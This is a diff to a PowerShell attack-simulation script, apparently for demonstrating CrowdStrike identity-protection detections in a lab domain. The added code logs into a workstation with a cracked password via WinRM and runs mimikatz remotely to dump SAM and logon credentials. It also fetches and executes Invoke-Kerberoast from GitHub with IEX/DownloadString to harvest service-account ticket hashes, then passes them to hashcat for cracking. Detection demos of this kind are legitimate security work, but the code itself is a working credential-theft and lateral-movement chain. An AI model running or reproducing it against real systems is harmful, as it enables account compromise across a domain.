@@ -432,80 +432,161 @@ public class CryptoMD4 {
         }
 
         # ================================================================
-        # STEP 6: DUMP DT + KERBEROAST (Active)
+        # STEP 6: DUMP DT + KERBEROAST (Active — Remote from Unmanaged)
         # ================================================================
         '6' {
             Show-StepBanner -Step "6" -Title "DUMP DT + KERBEROAST" -Lines @(
-                "Now on DT (via RDP), the attacker dumps local credentials."
-                "DT has CrowdStrike Falcon in DETECT mode - triggers detections."
+                "From this unmanaged host, the attacker remotely executes"
+                "on DT using the cracked demo account (WinRM / Invoke-Command)."
                 ""
-                "Result: only local accounts (demo, bob, ansible-user) - NO domain admin."
-                "Dead end for the attacker... so they pivot to KERBEROASTING."
+                "  6a: Remote mimikatz dump -> dead end (no domain admin)"
+                "  6b: Remote Kerberoast -> targets service account SPNs"
                 ""
-                "Kerberoasting requests TGS tickets for service accounts (SPNs),"
-                "then cracks them offline. CrowdStrike IDP detects this on the DC."
+                "DT has CrowdStrike Falcon in DETECT mode."
+                "Kerberoasting triggers IDP detection on the DC."
             ) -Detection "CrowdStrike: LSASS access, credential dump, Kerberoasting (IDP)"
 
-            # --- Sub-step 6a: Mimikatz dump on DT ---
+            # --- Build credential for remote execution ---
+            $demoPw = $null
+            if (Test-Path "$idpDir\demo_password.txt") {
+                $demoPw = (Get-Content "$idpDir\demo_password.txt" -First 1).Trim()
+            } else {
+                $demoPw = Read-Host "  Enter demo password (run Step 4 first)"
+            }
+            if (-not $demoPw) {
+                Write-Host "  [!] No demo password available. Run Step 4 first." -ForegroundColor Red
+                break
+            }
+
+            $secPw = ConvertTo-SecureString $demoPw -AsPlainText -Force
+            $cred = New-Object System.Management.Automation.PSCredential("$env:ENV_DT\demo", $secPw)
+
+            Write-Host "  [+] Credential: $env:ENV_DT\demo / $demoPw" -ForegroundColor Green
+            Write-Host "  [*] Target: $env:ENV_DT" -ForegroundColor White
+            Write-Host
+
+            # --- Test WinRM connectivity ---
+            Write-Host "  [*] Testing WinRM connectivity to $env:ENV_DT..." -ForegroundColor White
+            try {
+                $testResult = Invoke-Command -ComputerName $env:ENV_DT -Credential $cred -ScriptBlock { hostname } -ErrorAction Stop
+                Write-Host "  [+] WinRM OK — connected to: $testResult" -ForegroundColor Green
+            } catch {
+                Write-Host "  [!] WinRM failed: $_" -ForegroundColor Red
+                Write-Host
+                Write-Host "  WinRM may not be enabled on DT. To enable, run on DT (admin):" -ForegroundColor Yellow
+                Write-Host "    winrm quickconfig -force" -ForegroundColor Gray
+                Write-Host "  Or from this host (as admin):" -ForegroundColor Yellow
+                Write-Host "    wmic /node:$env:ENV_DT /user:$env:ENV_DT\demo /password:$demoPw process call create `"powershell -Command Enable-PSRemoting -Force`"" -ForegroundColor Gray
+                Write-Host
+                Write-Host "  Also ensure this host trusts DT:" -ForegroundColor Yellow
+                Write-Host "    Set-Item WSMan:\localhost\Client\TrustedHosts -Value '$env:ENV_DT' -Force" -ForegroundColor Gray
+                break
+            }
+            Write-Host
+
+            # ===========================================
+            # Step 6a: Remote mimikatz dump on DT
+            # ===========================================
             Write-Host "  ===========================================" -ForegroundColor DarkGray
-            Write-Host "  Step 6a: Mimikatz dump on DT" -ForegroundColor Yellow
+            Write-Host "  Step 6a: Remote mimikatz dump on DT" -ForegroundColor Yellow
             Write-Host "  ===========================================" -ForegroundColor DarkGray
             Write-Host
-            Write-Host "  In the RDP session on DT, open an admin cmd and run:" -ForegroundColor Cyan
-            Write-Host
-            Write-Host '    C:\IDP_Files\Mimikatz\x64\mimikatz.exe "privilege::debug" "token::elevate" "log C:\IDP_Files\dt_dump.log" "lsadump::sam" "sekurlsa::logonpasswords" "exit"' -ForegroundColor Green
-            Write-Host
-            Write-Host "  Expected result: demo, bob, ansible-user — NO domain admin cached." -ForegroundColor White
-            Write-Host "  -> This is a dead end. The attacker needs another approach." -ForegroundColor Red
+
+            $doMimiDump = Read-Host "  Run remote mimikatz dump on DT? (Y/n)"
+            if ($doMimiDump -ne 'n') {
+                Write-Host "  [*] Executing mimikatz remotely on $env:ENV_DT..." -ForegroundColor White
+
+                $mimiResult = Invoke-Command -ComputerName $env:ENV_DT -Credential $cred -ScriptBlock {
+                    $mimiPath = "C:\IDP_Files\Mimikatz\x64\mimikatz.exe"
+                    if (-not (Test-Path $mimiPath)) {
+                        return "[!] mimikatz.exe not found at $mimiPath on DT"
+                    }
+                    $output = & cmd.exe /c "`"$mimiPath`" `"privilege::debug`" `"token::elevate`" `"log C:\IDP_Files\dt_dump.log`" `"lsadump::sam`" `"sekurlsa::logonpasswords`" `"exit`"" 2>&1
+                    return ($output | Out-String)
+                } -ErrorAction Stop
+
+                Write-Host
+                Write-Host $mimiResult -ForegroundColor Gray
+                Write-Host
+                Write-Host "  [+] Remote dump complete." -ForegroundColor Green
+
+                # Check for interesting accounts
+                if ($mimiResult -match "clark\.monroe|svc_runbook|administrator") {
+                    Write-Host "  [!] Interesting account found! Check output above." -ForegroundColor Green
+                } else {
+                    Write-Host "  [-] Only local accounts found (demo, bob, ansible-user)." -ForegroundColor Yellow
+                    Write-Host "  [-] No domain admin cached. Dead end — pivoting to Kerberoasting." -ForegroundColor Red
+                }
+            }
             Write-Host
             pause
 
-            # --- Sub-step 6b: Kerberoast ---
+            # ===========================================
+            # Step 6b: Remote Kerberoast on DT
+            # ===========================================
             Write-Host
             Write-Host "  ===========================================" -ForegroundColor DarkGray
-            Write-Host "  Step 6b: Kerberoasting from DT" -ForegroundColor Yellow
+            Write-Host "  Step 6b: Kerberoasting from DT (remote)" -ForegroundColor Yellow
             Write-Host "  ===========================================" -ForegroundColor DarkGray
             Write-Host
             Write-Host "  The attacker pivots to Kerberoasting — requests TGS tickets" -ForegroundColor White
             Write-Host "  for all service accounts with SPNs in Active Directory." -ForegroundColor White
-            Write-Host "  Any domain user can do this (even demo)." -ForegroundColor White
+            Write-Host "  Any domain user can do this. demo is authenticated on DT." -ForegroundColor White
             Write-Host
             Write-Host "  This triggers CrowdStrike IDP detection on the DC:" -ForegroundColor Yellow
             Write-Host "    -> CredentialCompromise / SuspiciousKerberosTicketRequest" -ForegroundColor Yellow
             Write-Host
 
-            $doKerb = Read-Host "  Run Kerberoast on DT via RDP session? (y/N)"
-            if ($doKerb -eq 'y') {
+            $doKerb = Read-Host "  Run Kerberoast remotely on DT? (Y/n)"
+            if ($doKerb -ne 'n') {
+                Write-Host "  [*] Executing Invoke-Kerberoast on $env:ENV_DT..." -ForegroundColor White
                 Write-Host
-                Write-Host "  In the RDP session on DT, open a PowerShell (admin) and run:" -ForegroundColor Cyan
-                Write-Host
-                Write-Host '    IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1"); Invoke-Kerberoast -OutputFormat Hashcat | fl' -ForegroundColor Green
-                Write-Host
-                Write-Host "  To save the hash to a file:" -ForegroundColor Cyan
-                Write-Host '    IEX (New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1"); Invoke-Kerberoast -OutputFormat Hashcat | Select-Object -ExpandProperty Hash | Out-File C:\IDP_Files\kerberoast_hashes.txt' -ForegroundColor Green
-                Write-Host
-                Write-Host "  NOTE: Make sure svc_runbook (or svc_backup) has an SPN registered:" -ForegroundColor DarkGray
-                Write-Host "    setspn -A MSSQLSvc/warp-duck-DT.$($env:ENV_DOMAIN):1433 svc_runbook" -ForegroundColor DarkGray
-                Write-Host
-            }
 
-            # --- Sub-step 6c: Crack TGS hash ---
-            Write-Host "  ===========================================" -ForegroundColor DarkGray
-            Write-Host "  Step 6c: Crack the Kerberoast hash" -ForegroundColor Yellow
-            Write-Host "  ===========================================" -ForegroundColor DarkGray
-            Write-Host
-            Write-Host "  If you got a TGS hash, crack it with hashcat:" -ForegroundColor White
-            Write-Host "    hashcat -m 13100 kerberoast_hashes.txt wordlist.txt" -ForegroundColor Green
-            Write-Host
-            Write-Host "  Or paste the hash below to try cracking with the local wordlist." -ForegroundColor White
-            Write-Host
-            $tgsHash = Read-Host "  Paste TGS hash (or Enter to skip)"
-            if ($tgsHash) {
-                Write-Host
-                Write-Host "  [*] TGS hash saved. Use hashcat offline to crack:" -ForegroundColor Yellow
-                $tgsHash | Out-File -FilePath "$idpDir\kerberoast_tgs.txt" -Encoding ASCII
-                Write-Host "    Saved to: $idpDir\kerberoast_tgs.txt" -ForegroundColor Green
-                Write-Host "    hashcat -m 13100 $idpDir\kerberoast_tgs.txt $idpDir\wordlist.txt" -ForegroundColor Green
+                try {
+                    $kerbResult = Invoke-Command -ComputerName $env:ENV_DT -Credential $cred -ScriptBlock {
+                        try {
+                            IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')
+                            $results = Invoke-Kerberoast -OutputFormat Hashcat -ErrorAction Stop
+                            if ($results) {
+                                $hashes = $results | Select-Object -ExpandProperty Hash
+                                $hashes | Out-File -FilePath "C:\IDP_Files\kerberoast_hashes.txt" -Encoding ASCII
+                                return @{
+                                    Success = $true
+                                    Count   = @($results).Count
+                                    Hashes  = ($hashes | Out-String)
+                                    Users   = ($results | Select-Object -ExpandProperty SamAccountName | Out-String)
+                                }
+                            } else {
+                                return @{ Success = $false; Error = "No SPN accounts found. Register SPNs first." }
+                            }
+                        } catch {
+                            return @{ Success = $false; Error = $_.ToString() }
+                        }
+                    } -ErrorAction Stop
+
+                    if ($kerbResult.Success) {
+                        Write-Host "  [+] Kerberoast SUCCESS! Found $($kerbResult.Count) service account(s):" -ForegroundColor Green
+                        Write-Host "  $($kerbResult.Users)" -ForegroundColor White
+                        Write-Host
+                        Write-Host "  --- TGS Hash(es) ---" -ForegroundColor Yellow
+                        Write-Host $kerbResult.Hashes -ForegroundColor Gray
+                        Write-Host
+
+                        # Save hashes locally
+                        $kerbResult.Hashes | Out-File -FilePath "$idpDir\kerberoast_hashes.txt" -Encoding ASCII
+                        Write-Host "  [+] Hashes saved to $idpDir\kerberoast_hashes.txt" -ForegroundColor Green
+                        Write-Host
+                        Write-Host "  Crack with hashcat:" -ForegroundColor Cyan
+                        Write-Host "    hashcat -m 13100 $idpDir\kerberoast_hashes.txt $idpDir\wordlist.txt" -ForegroundColor Green
+                    } else {
+                        Write-Host "  [!] Kerberoast returned no results: $($kerbResult.Error)" -ForegroundColor Red
+                        Write-Host
+                        Write-Host "  Make sure a service account has an SPN. On the DC run:" -ForegroundColor Yellow
+                        Write-Host "    setspn -A MSSQLSvc/warp-duck-DT.$($env:ENV_DOMAIN):1433 svc_runbook" -ForegroundColor Gray
+                    }
+                } catch {
+                    Write-Host "  [!] Remote Kerberoast failed: $_" -ForegroundColor Red
+                }
             }
             Write-Host
         }
